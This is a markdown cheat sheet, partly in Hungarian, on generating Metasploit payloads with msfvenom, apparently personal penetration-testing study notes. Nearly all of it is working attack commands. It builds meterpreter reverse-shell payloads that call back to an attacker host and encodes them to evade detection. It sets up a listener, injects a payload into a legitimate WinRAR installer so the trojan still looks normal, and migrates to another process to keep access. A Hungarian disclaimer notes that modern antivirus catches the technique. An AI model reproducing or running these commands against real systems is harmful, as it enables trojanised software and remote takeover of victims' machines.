# msfvenom
## generating payloads
* $msfvenom
* $msfvenom --list payloads
* $msfvenom --list formats
* staged vs stagless payloads
  * staged payload example: linux/x86/shell/reverse_tcp
  * stageless payload example: linux/x86/shell_reverse_tcp
* x86 vs x64 (specifing arch)
  * $msfvenom -a x86 -p windows/meterpreter/reverse_tcp
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp
  * $msfvenom -a x64 -p windows/meterpreter/reverse_tcp
  * $msfvenom -p windows/x64/meterpreter/reverse_tcp
* output payload file
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -o payload.exe
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe > ./payload.exe
* payload format
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -o payload.exe
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f elf -o payload
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f dll -o payload.dll
  * $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f jar -o payload.jar
* set msf listener for msfvenom payload
  * msf6> use multi/handler
  * msf6> set lhost tun0
  * msf6> set lport 1234
  * msf6> run
* send payload to victim machine
  * e.g. with python server...
## encoding payloads
* msfvenom --list encoders
* $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -e x86/shikata_ga_nai -f exe -o payload.exe
* $msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
  * encoding 10 times with the given algorithm
## injection payload into (legitimate) Windows PE file
### DISCLAIMER
* ez egy legacy technique
* a mai virusirtokat nem lehet atverni ezzel, es gyorsan kiszurjak, hogy valami nem oke
* felismerik az injektalast, felismerik a meterpreter payloadot, felismerik az msfvenom generalta payloadokat, es vissza tudjak fejteni az encode-olast is
### inject commands
* $msfvenom -x    (inject payload in an existing thread)
  * az eredeti exe fajl nem fog mukodni, hanem a shell command indul el helyette
* $msfvenom -x -k (inject payload as new thread)
  * a shell command lefutasa mellett elindul az eredeti exe fajl is teljesen normalisan, pl a telepito menu megnyilik ha telepito fajlrol van szo
* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -x ./winrar_setup.exe -o winrar.exe
* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f exe -x ./winrar_setup.exe -k -o winrar.exe
### hova lehet injektalni es hova nem
* nem minden executable fajlba lehet injektalni
  * winrar-ba kifejezetten jol lehet !!!
* nem minden executable fajlnal mukodik az, hogy megmaradjon az eredeti funkcionalitasa is amellett, hogy a shell access is letrejon!!!
### persistance
* hogyha sikerult meterpreter shell access-t osszehozni, akkor erdemes egybol atmigralni valami masik process-be
  * ami sokkal stabilabb
  * mert egy sima exe fajl konnyen bezarodhat
